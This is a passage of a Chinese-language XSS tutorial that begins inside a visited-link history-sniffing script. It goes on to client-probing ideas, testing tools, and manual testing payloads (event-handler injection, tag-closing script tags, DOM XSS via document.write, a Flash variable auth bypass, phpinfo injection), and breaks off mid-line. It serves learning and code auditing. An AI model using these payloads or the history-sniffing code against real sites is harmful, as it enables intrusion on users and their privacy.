<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">appendChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">		var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> color</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">defaultView</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getComputedStyle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getPropertyValue</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;color&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">removeChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">		/* check to see if the link has been visited if the computed color is red */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">		if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">color</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;rgb(255, 0, 0)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) { </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// visited</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">			/* add the link to the visited list */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">			var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> item</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">createElement</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;li&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">			item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">appendChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">			document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getElementById</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;visited&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">appendChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">			</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		} </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// not visited</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">			/* add the link to the not visited list */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">			var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> item</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">createElement</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;li&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">			item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">appendChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">			document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getElementById</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;notvisited&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">appendChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">			</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		} </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// end visited color check if</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	} </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// end URL loop</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>遍历查询用户是否访问过某些网站；</p><h2 id="_2-4-客户端信息刺探" tabindex="-1"><a class="header-anchor" href="#_2-4-客户端信息刺探"><span>2.4 客户端信息刺探</span></a></h2><h3 id="_2-4-1-javascript实现端口扫描" tabindex="-1"><a class="header-anchor" href="#_2-4-1-javascript实现端口扫描"><span>2.4.1 javascript实现端口扫描</span></a></h3><p><a href="https://www.gnucitizen.org/blog/javascript-port-scanner/" target="_blank" rel="noopener noreferrer">端口扫描工具</a></p><p>还有很多其他工具，这个不一定好用；</p><h3 id="_2-4-2-截获剪切板内容" tabindex="-1"><a class="header-anchor" href="#_2-4-2-截获剪切板内容"><span>2.4.2 截获剪切板内容</span></a></h3><p>截获用户的剪切板信息是为了获取用户可能截取的关键信息；</p><h3 id="_2-4-3-获取客户端ip" tabindex="-1"><a class="header-anchor" href="#_2-4-3-获取客户端ip"><span>2.4.3 获取客户端IP</span></a></h3><p><a href="https://juejin.cn/post/6844903984356917256" target="_blank" rel="noopener noreferrer">介绍链接</a></p><p><strong>更多可以和xss进行联动的攻击例如DDOS，XSSworm请自行搜寻</strong></p><h2 id="_2-5-xss工具利用" tabindex="-1"><a class="header-anchor" href="#_2-5-xss工具利用"><span>2.5 XSS工具利用</span></a></h2><h3 id="_2-5-1-firebug" tabindex="-1"><a class="header-anchor" href="#_2-5-1-firebug"><span>2.5.1 firebug</span></a></h3><p>firefox插件，可动态修改页面，并将结果反映到浏览器窗口，可抓取流量包，具有dom查看器，并且firebug具有查看最终源代码的功能；</p><h3 id="_2-5-2-tamper-data" tabindex="-1"><a class="header-anchor" href="#_2-5-2-tamper-data"><span>2.5.2 Tamper Data</span></a></h3><p>类似于轻量化的bp抓包功能</p><h3 id="_2-5-3-live-http-headers" tabindex="-1"><a class="header-anchor" href="#_2-5-3-live-http-headers"><span>2.5.3 Live HTTP Headers</span></a></h3><p>拦截流量包，添加了replay功能；</p><h3 id="_2-5-4-fiddler" tabindex="-1"><a class="header-anchor" href="#_2-5-4-fiddler"><span>2.5.4 Fiddler</span></a></h3><p>抓包工具，可查看所有数据包以及返回内容；</p><p><strong>bp具有以上工具的大部分功能</strong></p><h2 id="_2-6-xss漏洞挖掘" tabindex="-1"><a class="header-anchor" href="#_2-6-xss漏洞挖掘"><span>2.6 XSS漏洞挖掘</span></a></h2><h3 id="_2-6-1-黑盒工具测试" tabindex="-1"><a class="header-anchor" href="#_2-6-1-黑盒工具测试"><span>2.6.1 黑盒工具测试</span></a></h3><p>(1)Acunetix</p><p>(2)XssDetect</p><p>(3)ratpeoxy</p><p><strong>手动黑盒测试</strong></p><p>测试内容：</p><p>&lt;&gt; ，xss，&amp;,#等重要字符是否过滤，输入这类字符后，在页面查看是否转码或是编译；</p><p>也可以直接使用完整的XSS代码进行测试；</p><p>如果过滤了&lt;&gt;等字符，我们可以采用事件触发xss</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">origin:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;name&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">$xxx?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">//其中$xx为动态内容,赋值为xss onmouseover=evil_script(),得到最终渲染内容</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">input</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;name&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">xss</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> onmouseover</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">evil_script</span><span style="--shiki-light:#383A42;--shiki-dark:#98C379;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">//执行事件</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>对url的测试</p><p>通常我们可以看出url中的参数，我们对这些参数分别赋值测试即可</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">eg:我们有如下url</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">www.test.com?a=123&amp;b=123&amp;c=123</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">我们的测试方法为</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">www.test.com?a=alert</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&quot;xss&#39;&gt;&amp;b=123&amp;c=123</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">//同理对b,c进行赋值</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通常我们会遇到需要闭合标签的情况，例如</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;xss&quot;&gt;</span></span>
<span class="line"><span>XSS为我们可控制的值，我们就可以闭合标签;</span></span>
<span class="line"><span>//xss  &quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;</span></span>
<span class="line"><span>&lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;&quot;&gt;</span></span>
<span class="line"><span>//从而执行我们的代码；</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-7-xss源代码审计" tabindex="-1"><a class="header-anchor" href="#_2-7-xss源代码审计"><span>2.7 XSS源代码审计</span></a></h2><p>源代码审计，即白盒测试，在拥有源代码的情况下我们对XSS漏洞进行挖掘并修复；</p><p>基本思路：</p><p>寻找页面可输出变量，检验他们是否受到控制，跟踪变量的传递方式，查看过滤以及是否被htmlencode();</p><p>通常存在动态内容的标签</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">input style img.......</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>获取可控动态变量</strong></p><p><strong>php</strong></p><p>查看全局变量</p><figure><img src="/articles/assets/phpgloabal-BJwZ5Hf7.png" alt="phpgloabal" tabindex="0" loading="lazy"><figcaption>phpgloabal</figcaption></figure><p>这些对象我们通常都需要审计；</p><p><strong>javascript</strong></p><p><strong>DOMXSS挖掘</strong></p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">假设我们有如下代码</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">head</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt; DOM XSS Test&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">head</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> a</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">URL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">            document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">substring</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">indexOf</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;a=&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">length</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">));</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这段代码的作用是从rul接收一个a，并将a打印在首页，且并没有进行过滤，我们可以利用a；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>?a=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>浏览器会将html文本解析成dom，并返回代码执行结果；</p><p>domxss发掘</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>document.referrer属性</span></span>
<span class="line"><span>window.name属性</span></span>
<span class="line"><span>location属性</span></span>
<span class="line"><span>//重点检查用户输入源，例如上述属性值</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>挖掘输出位置，即字符串在页面的输出位置列入:innerHTML,document.write等函数</p><p>二者基本思路：跟踪函数变量，查看是否能够控制；</p><p><strong>FlashXSS发掘</strong></p><p>flash具有内置编程语言ActionScript;ActionScript语言编写不规范，同样能造成XSS；</p><p>ActionScript2.0具有类似于php注册全局变量的特性，任何未初始化的变量都可以通过flashvar进行初始化；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>例如:</span></span>
<span class="line"><span>if(checkLogin()){</span></span>
<span class="line"><span>	user=true;</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>if(user){</span></span>
<span class="line"><span>	manager();</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>我们只需要?user=true即可绕过过滤;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="/articles/assets/actionscript-M2i06YhU.png" alt="actionscript" tabindex="0" loading="lazy"><figcaption>actionscript</figcaption></figure><p>要挖掘flash，我们需要多.swf文件反编译，得到actionscript代码，推荐使用action script viewer;</p><p>同样的，我们需要寻找可以控制的输入点，特别是load*方法;</p><h2 id="_2-8-利用语言特性" tabindex="-1"><a class="header-anchor" href="#_2-8-利用语言特性"><span>2.8 利用语言特性</span></a></h2><p><strong>phpinfo()</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;?php</span></span>
<span class="line"><span>phpinfo();</span></span>
<span class="line"><span>?&gt;</span></span>
<span class="line"><span>//编写如下文件，执行得到phpinfo界面</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在低版本的phpinfo()中，对用户输入的变量没有转义就打印出来，攻击者可以通过构造特殊url向phpinfo()中注入html代码引起xss;</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>http://127.0.0.1/phpinfo.php?a[]=&lt;script&gt;alert(/xss/);&lt;/script&gt;</span></span>
<span class="line"><span>//经测试5.3.29版本已经具有转义功能</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>$_SERVER[PHP_SELF]</strong></p><p>该代码表示php文件相对于网站根目录的相对位置，假设有如下代码</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">form</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> method</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;POST&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&lt;?php echo </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_SERVER</span><span 